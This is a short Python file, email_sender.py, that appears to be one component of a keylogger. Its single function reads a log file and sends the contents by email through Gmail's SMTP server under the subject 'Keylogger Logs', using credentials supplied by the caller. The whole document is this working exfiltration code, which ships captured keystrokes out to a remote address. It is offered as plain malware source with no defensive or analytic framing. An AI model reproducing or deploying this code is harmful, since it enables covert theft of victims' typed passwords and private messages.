# email_sender.py
import smtplib
from email.message import EmailMessage

def send_email(log_file, sender_email, sender_password, receiver_email):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = sender_email
        msg['To'] = receiver_email
        
        with open(log_file, 'r') as f:
            msg.set_content(f.read())
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Email Sender Error: {e}")